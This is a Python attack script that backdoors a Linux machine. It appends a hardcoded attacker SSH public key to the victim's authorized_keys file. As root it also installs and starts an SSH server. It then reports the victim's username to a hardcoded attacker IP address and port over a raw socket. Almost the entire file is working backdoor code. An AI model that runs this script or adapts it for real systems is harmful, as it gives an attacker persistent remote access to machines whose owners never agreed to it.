#!/usr/bin/python3

"""
This script does a couple of things.
Have a look at the 'if main' body at the end of file to understand what it does.
The best documentation for the code is the code it self 😛

So about the conditions that need to be satisfied so that everything here goes well.
1- Internet access 😮
2- attacker_public_key is really the attacker's public key
3- Same goes for the attacker_ip_address and attacker_port_number
4- One of 2 things:-
    4-1) either the user is root
    4-2) or the user has ssh daemon running on the background
5- attacker_module script is running on the attacker's machine
"""

import os
import getpass
import socket
import subprocess
from pathlib import Path

attacker_public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/rG4rrgjmRctI6bUqzA/eDd36r2RIGYIcU9dH3QwcBgtqpZgH4MSettQmgfFL+GLWD82wGxi69WP8LFC9iQ7ibm8HdL8U59UvfRkxtg7dhJePNeswqNgQ19A9rYBFpnQbbDpcot8iPl4rEtFs2i5sFlRVdEKt4LtuQ3zggm0Ka5xC4N0CaC4Jx370dulzHpNbKsj6drZg0wXksphZ5yWktuiYvpigeR1gm44iy9yfLpgZ7CXrhxperQghbCtuFboBgNwQxsCYxk7g7a9ARRg8CbKCms2oqd9TWYowL9ZTaDbAxXvuBN17DJ979aTOZcQnG/Ko7wpS4G7cA2tH7Xgh islam@islam "
victim_username = getpass.getuser()
attacker_ip_address = "25.65.189.47"
attacker_port_number = 6001


def add_public_key_to_authorized_keys():
    if victim_username == "root":
        path_to_ssh = Path("/root", ".ssh")
    else:
        path_to_ssh = Path("/home", victim_username, ".ssh")

    # Just to make sure that the ~/.ssh folder exists
    os.makedirs(path_to_ssh.as_posix(), exist_ok=True)

    path_to_authorized_keys = Path(path_to_ssh, "authorized_keys").as_posix()

    try:
        print("Accessing authorized_key file")
        with open(path_to_authorized_keys, "r")as f:
            authorized_keys = [line.strip() for line in f.readlines()]

            if attacker_public_key not in authorized_keys:
                authorized_keys.append(attacker_public_key)

        with open(path_to_authorized_keys, "w") as f:
            f.write("\n".join(authorized_keys))

    # authorized_keys file does not exist
    except IOError:
        print("No authorized_keys. No prob ✋, creating one now")
        with open(path_to_authorized_keys, "w+") as f:
            f.write(attacker_public_key + "\n")

    print("Attacker's public key added 👍")


def install_openssh_server():
    if victim_username != "root":
        print("This user is not root. Cannot download or run ssh server.")
        return

    print("Installing openssh_server...")
    install_process = subprocess.Popen("sudo apt -y install openssh-server", shell=True,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    _, err = install_process.communicate()


def run_ssh_daemon():
    if victim_username != "root":
        return
    ssh_daemon_process = subprocess.Popen("sudo service ssh start", shell=True,
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    _, err = ssh_daemon_process.communicate()


def send_victim_username_to_attacker():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        print("Sending the username of the victim to the attacker")
        sock.connect((attacker_ip_address, attacker_port_number))
        sock.send(victim_username.encode())

    print("IP sent to the attacker")


if __name__ == '__main__':
    add_public_key_to_authorized_keys()
    install_openssh_server()
    run_ssh_daemon()
    send_victim_username_to_attacker()
